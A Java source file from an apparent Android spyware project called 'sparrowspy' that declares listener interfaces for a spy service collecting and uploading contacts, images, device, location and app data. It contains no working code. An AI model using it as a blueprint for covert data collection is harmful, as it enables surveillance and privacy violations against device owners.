package com.tangledbytes.sparrowspy.events;

public class Events {
    public interface SpyServiceStateChangeListener {
        /**
         * Called when Service starts
         */
        void onStart();

        /**
         * Called when Service finish
         */
        void onFinish();
    }

    public interface DataCollectionListener {
        /**
         * Called when contacts are collected
         */
        void onContactsCollected(boolean success);

        /**
         * Called when images are collected
         */
        void onImagesCollected(boolean success);

        /**
         * Called when device info, location info and apps info are collected
         */
        void onDeviceInfoCollected(boolean success);
    }

    public interface DataUploadListener {
        void onContactsUploaded(boolean success);

        void onImagesUploaded(boolean success);

        void onDeviceInfoUploaded(boolean success);
    }
}
